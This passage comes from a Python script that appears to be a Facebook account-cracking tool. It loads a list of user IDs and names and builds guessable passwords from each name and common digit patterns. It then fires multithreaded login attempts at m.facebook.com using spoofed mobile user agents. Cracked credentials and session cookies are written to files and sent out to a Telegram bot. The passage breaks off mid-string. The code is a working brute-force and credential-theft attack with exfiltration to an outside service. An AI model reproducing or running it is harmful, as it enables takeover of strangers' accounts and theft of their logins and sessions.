Trident/4.0)', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0']
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
	a='Nokia5350/10.1.011 (SymbianOS/10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/525 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/525 3gpp-gba'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)    
	
	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/413 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/413 UNTRUSTED/1.0'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-X906B)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['nokiac1-01)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='U2/1.0.0 UCBrowser/8.9.0.251'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='U2/1.0.0 Mobile UNTRUSTED/1.06'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
#asu = random.choice([m,k,h,u,b])
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
dic = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
dic2 = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
ua = 'Mozilla/5.0 (Linux; Android 10; LIO-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.3'
###########################################################################################
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
		
		
def banner():
	print(a12+'نمرود SDM ')
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;153m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي8
	
#------------------[ BAGIAN-MENU ]----------------#
def SDM():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies NO ')
		time.sleep(5)
		SDMM()
	os.system('clear')
	banner()
	print(f'[ 01 ] FILE CLONE| صـيد من ملف') 
	print(f'[ 00 ] Exit | خـࢪوج') 
	_____IPYTHONI_____ = input(a31+'Select :\x1b[1;97m ')
	if _____IPYTHONI_____ in ['1','01']:
		F()
	elif _____IPYTHONI_____ in ['0','00']:
		sys.exit()
	else:
		print(a20+'NOT SELECT ')
		back()
def error():
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m~~~~~Main menu~~~~~')
	time.sleep(2)
	back()
def F():
    banner()
    D().plerr()

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			fileX = input (a22+' ENTER FILE NAME : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(a26+'TOTAL IDS : '+str(len(id)))
			for i in range(101):
				print("\rLoading => "+str(i)+"%",end="")
				time.sleep(0.02)
			Settings()
		except IOError:
			print("ERROR File %s"%(fileX));time.sleep(2)
			F()
				
def Settings():
	banner()
	print(a26+' [ 01 ] Slow\n [ 02 ] Fast')
	hu = input(a26+' Select => ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(a26+'Error SELECT')
		exit()
	write("-"*30)
	print(f' [ 01 ] Method Fast')
	hc = input(a26+' Select => ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	write("-"*30)
	pwplus=input(a26+' [ 01 ] Normal\n [ 02 ] Fast\n SELECT => ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'ExSample : qwerty,qwerty2,qwerty3')
		pwku=input('ADD Your Password => ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit()
def write(string,slp=0.02):
	for i in string+"\n":
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(slp)
def passwrd():

    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append('frs+frs')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append('firstlast')
                    pwv.append('first123')
                    pwv.append('first1234567')
                    pwv.append(frs+"123123")
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('77889900')
                    pwv.append('00009999')
                    pwv.append('mmnnbbvv')
                    pwv.append('ppooiiuuyy')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('zxcvzxcv')
                    pwv.append('qwertyuiopasdfghjkl')
                    pwv.append('0099887766')
                    pwv.append('1020304050')
                    pwv.append('102030405060708090')
                    pwv.append('112233445566778899')
                    pwv.append('00998877665544332211')
                    pwv.append('1122334455@@')
                    pwv.append('20042004')
                    pwv.append('20032003')
                    pwv.append('20022002')
                    pwv.append('20202020')
                    pwv.append('20222022')
                    pwv.append('20232023')
                    pwv.append('19801980')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append('frs+frs')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append('firstlast')
                    pwv.append('first123')
                    pwv.append('first1234567')
                    pwv.append(frs+"123123")
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('77889900')
                    pwv.append('00009999')
                    pwv.append('mmnnbbvv')
                    pwv.append('ppooiiuuyy')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('zxcvzxcv')
                    pwv.append('qwertyuiopasdfghjkl')
                    pwv.append('0099887766')
                    pwv.append('1020304050')
                    pwv.append('102030405060708090')
                    pwv.append('112233445566778899')
                    pwv.append('00998877665544332211')
                    pwv.append('1122334455@@')
                    pwv.append('12345@@@@@')
                    pwv.append('1122334455@@@@@')
                    pwv.append('20042004')
                    pwv.append('20032003')
                    pwv.append('20022002')
                    pwv.append('20202020')
                    pwv.append('20212021')
                    pwv.append('20222022')
                    pwv.append('20232023')
                    pwv.append('19801980')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(cracktouch,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic,idf,pwv)
            else:
                pool.submit(crackmbasic,idf,pwv)
    print('')
    print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
    print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rc = random.choice
	amr = rc(['😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])
	sys.stdout.write(f"\r{bo}({amr}🔱 نمــࢪود 🔱𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''
					▄︻デ══━一 «𝗖𝗣❌  سڪيوࢪ ࿐» ⏎
❰▭▬▭▬▭▬﹝𝐂𝐏﹞▭▬▭▬▭▬❱
 (𝑆𝐷𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n

(𝑆𝐷𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{pw}
❰▭▬▭▬▭▬﹝𝐂𝐏﹞▭▬▭▬▭▬❱
(🏴༒🔱 نمــࢪود 🔱༒)  𖣬 :『@M_T_F  』⏎
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='SESI'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''▄︻デ══━一 «𝗢𝗞✅ شـغال\n ࿐» ⏎
\n❰▭▬▭▬▭▬﹝𝐎𝐊﹞▭▬▭▬▭▬❱
\n (𝑆𝐷𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆𝐷𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆𝐷𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 :  ッ \n:{kuki}
